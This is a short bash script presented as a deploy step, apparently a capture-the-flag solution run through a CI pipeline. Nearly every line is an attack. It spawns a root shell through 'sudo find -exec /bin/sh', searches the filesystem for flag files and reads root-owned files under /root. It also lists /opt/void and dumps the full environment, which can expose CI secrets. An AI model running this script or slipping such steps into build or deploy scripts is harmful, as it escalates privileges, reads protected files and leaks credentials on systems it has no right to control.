#!/usr/bin/env bash
set -euo pipefail

echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"

echo "=== CI FLAG ==="
cat /opt/void/ci_flag.txt 2>/dev/null || echo "No ci_flag"

echo "=== SUDO CHECK ==="
sudo -l

echo "=== ROOT ACCESS VIA FIND ==="
sudo find /root -exec /bin/sh \; -quit

echo "=== ROOT FLAG SEARCH ==="
sudo find / -iname "*flag*" 2>/dev/null

echo "=== TRY READING ROOT FILES ==="
sudo cat /root/flag.txt 2>/dev/null || true
sudo cat /root/root.txt 2>/dev/null || true
sudo ls -la /root 2>/dev/null || true

echo "=== VOID DIRECTORY ==="
sudo ls -la /opt/void 2>/dev/null || true
sudo find /opt/void -type f 2>/dev/null || true

echo "=== ENV ==="
env
